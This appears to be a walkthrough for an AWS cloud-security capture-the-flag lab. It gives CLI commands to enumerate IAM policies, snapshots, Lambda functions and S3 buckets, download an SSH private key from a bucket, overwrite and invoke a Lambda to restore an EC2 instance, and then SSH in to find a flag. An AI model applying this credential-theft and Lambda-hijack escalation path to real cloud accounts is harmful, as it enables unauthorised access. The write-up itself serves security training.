
## Reconnaissance

1. Assume the "ls-user" role
   ```
   aws configure --profile ls-user
   ```

2. List policies attached to the "ls-user":
   ```
   aws iam list-attached-user-policies --user-name ls-user
   ```

3. List available EC2 snapshots:
   ```
   aws --profile ls-user --region us-east-1 ec2 describe-snapshots --owner-ids self
   ```

   Optional: Attempt to restore the snapshot as the ls-user directly (Will not work)
   ```
   aws ec2 create-volume --snapshot-id <snapshot-id> --availability-zone us-east-1a
   ```
   
5. List available Lambda functions:
   ```
   aws --profile ls-user --region us-east-1 lambda list-functions
   ```

6. List S3 buckets and their contents:
   ```
   aws --profile ls-user --region us-east-1 s3 ls
   ```

   ```
   aws --profile ls-user --region us-east-1 s3 ls s3://<bucket-name>
   ```

7. Download the SSH key from the S3 bucket:
   ```
   aws --profile ls-user --region us-east-1 s3 cp s3://<bucket-name>/ssh_key ./ssh_key.pem
   chmod 400 ssh_key.pem
   ```

*Dont forget to change the permissions of the ssh key*
   ```
   chmod 400 ssh_key.pem
   ```
8. List AMIs:
```
aws --profile ls-user --region us-east-1 ec2 describe-images --owners self
```

8. List subnets:
```
aws --profile ls-user --region us-east-1 ec2 describe-subnets
```

9. List security groups:
```
aws --profile ls-user --region us-east-1 ec2 describe-security-groups
```


## Lambda Function Invocation

1. Download the Lambda function code:
   ```
   aws --profile ls-user --region us-east-1 lambda get-function --function-name RestoreSnapshot --query 'Code.Location' --output text | xargs curl -o lambda_function.zip
   ```

2. Update the Lambda function code with the necessary resources discovered during reconnaissance (snapshot ID, AMI ID, subnet ID, security group ID).

3. Zip the updated Lambda function code:
   ```
   zip lambda_function.zip lambda_function.py
   ```

4. Update the Lambda function code:
   ```
   aws --profile ls-user --region us-east-1 lambda update-function-code --function-name RestoreSnapshot --zip-file fileb://lambda_function.zip
   ```

5. Invoke the Lambda function:
   ```
   aws --profile ls-user --region us-east-1 lambda invoke --function-name RestoreSnapshot output.txt
   ```


## Accessing the Restored EC2 Instance

1. List running EC2 instances:
   ```
   aws --profile ls-user --region us-east-1 ec2 describe-instances --filters "Name=instance-state-name,Values=running"
   ```

2. SSH into the restored EC2 instance:
   ```
   ssh -i ssh_key.pem ec2-user@<public-ip>
   ```

3. Find the flag inside the EC2 instance to complete the scenario.

4. Terminate the EC2 instance once you are done (The "destroy" command will not remove the instance)
   ```
   aws ec2 terminate-instances --instance-ids YOUR_INSTANCE_ID
   ```





